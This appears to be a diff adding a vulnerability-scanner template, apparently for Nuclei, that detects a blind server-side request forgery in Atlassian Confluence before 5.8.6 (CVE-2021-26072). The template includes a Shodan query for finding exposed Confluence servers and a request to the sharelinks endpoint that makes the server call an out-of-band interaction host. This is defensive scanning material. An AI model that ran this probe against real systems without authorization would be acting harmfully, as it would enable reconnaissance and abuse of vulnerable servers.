@@ -1,0 +1,44 @@
+id: confluence-ssrf-sharelinks
+
+info:
+  name: Atlassian Confluence < 5.8.6 Server-Side Request Forgery
+  author: TechbrunchFR
+  severity: medium
+  description: Atlassian Confluence < 5.8.6 is affected by a blind server-side request forgery vulnerability in the widgetconnector plugin.
+  reference:
+    - https://bitbucket.org/atlassian/confluence-business-blueprints/pull-requests/144/issue-60-conf-45342-ssrf-in-sharelinks
+    - https://github.com/assetnote/blind-ssrf-chains#confluence
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-26072
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 6.8
+    cwe-id: CWE-918
+  remediation: Upgrade to Atlassian Confluence version 5.8.6 or later.
+  metadata:
+    shodan-query: http.component:"Atlassian Confluence"
+  tags: confluence,atlassian,ssrf,oast
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/rest/sharelinks/1.0/link?url=https://{{interactsh-url}}/'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - "http"
+
+      - type: word
+        part: body
+        words:
+          - "faviconURL"
+          - "domain"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/04/14
